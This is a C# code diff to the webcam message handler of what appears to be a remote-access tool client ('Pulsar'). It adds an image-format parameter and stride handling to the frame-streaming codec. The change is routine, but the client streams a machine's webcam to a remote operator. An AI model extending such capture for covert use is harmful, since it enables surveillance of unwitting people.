@@ -12,6 +12,7 @@ using System.Diagnostics;
 using Pulsar.Common.Messages.Webcam;
 using Pulsar.Common.Messages.Other;
 using System.Collections.Concurrent;
+using Pulsar.Client.Utilities;
 
 namespace Pulsar.Client.Messages
 {    
@@ -123,19 +124,19 @@ namespace Pulsar.Client.Messages
                 try
                 {
                     if (_streamCodec == null)
-                        _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
+                        _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution, RemoteCaptureEncoding.PreferredFormat);
 
                     if (message.CreateNew)
                     {
                         _streamCodec?.Dispose();
-                        _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
+                        _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution, RemoteCaptureEncoding.PreferredFormat);
                         OnReport("Remote webcam session started");
                     }
 
                     if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
                     {
                         _streamCodec?.Dispose();
-                        _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
+                        _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution, RemoteCaptureEncoding.PreferredFormat);
                     }
                 }
                 catch (Exception ex)
@@ -348,9 +349,11 @@ namespace Pulsar.Client.Messages
 
                 if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
                 _streamCodec.CodeImage(_webcamData.Scan0,
+                    _webcamData.Stride,
                     new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
                     new Size(processedBitmap.Width, processedBitmap.Height),
-                    processedBitmap.PixelFormat, ReusableStream);
+                    processedBitmap.PixelFormat,
+                    ReusableStream);
 
                 return ReusableStream.ToArray();
             }
@@ -384,7 +387,8 @@ namespace Pulsar.Client.Messages
                     Monitor = _streamCodec.Monitor,
                     Resolution = _streamCodec.Resolution,
                     IsLastRequestedFrame = isLastRequestedFrame,
-                    FrameRate = 0f
+                    FrameRate = 0f,
+                    ImageFormat = RemoteCaptureEncoding.PreferredFormat
                 };
 
                 if (_sendFrameRateNext)
